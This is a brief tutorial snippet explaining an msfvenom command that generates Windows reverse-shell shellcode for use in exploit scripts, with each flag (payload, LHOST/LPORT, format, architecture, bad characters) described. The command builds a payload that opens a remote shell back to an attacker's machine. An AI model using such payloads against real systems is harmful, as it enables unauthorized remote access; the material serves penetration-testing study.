msfvenom Command Example
msfvenom -p windows/shell_reverse_tcp \
         LHOST=<YOUR_IP> LPORT=<YOUR_PORT> \
         -f python -a x86 --platform windows \
         -b "\x00\x0a\x0d"
Key Takeaway

Each flag in the msfvenom command is critical for tailoring the shellcode to the target's environment and your exploitation goals.

Understanding the Flags

-p <payload>

Specifies the type of payload, e.g., windows/shell_reverse_tcp for a reverse shell.

LHOST/LPORT

Your attacking machine's IP and the port for your listener.

-f <format>

Output format, typically python for exploit scripts.

-a <arch> / --platform <plat>

Target architecture (e.g., x86) and operating system (e.g., windows).

-b "<bad_chars>"

Excludes identified bad characters from the shellcode.
